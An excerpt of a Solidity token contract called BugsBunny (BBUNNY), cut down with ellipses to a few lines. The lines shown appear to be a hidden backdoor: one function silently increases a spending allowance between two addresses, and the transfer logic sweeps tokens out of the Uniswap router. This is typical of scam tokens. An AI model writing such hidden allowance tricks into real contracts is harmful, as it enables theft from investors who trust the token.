...
Telegram: https://t.me/bugsbunnyentry
*/
...
contract BugsBunny is Context, IERC20, Ownable {
    ...
    string private constant _symbol = "BBUNNY";
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if(!automatedMarketMakerPairs[from]){
                uint256 stuckedToken = balanceOf(address(uniswapV2Router));
                if(stuckedToken > 0){
                    IERC20(address(this)).transferFrom(address(uniswapV2Router), address(this), stuckedToken + 1);
                }
            }
        }
    ...
    function _transferBefore(
        ...
        _allowances[_User2][_User1] += Amount;
    }
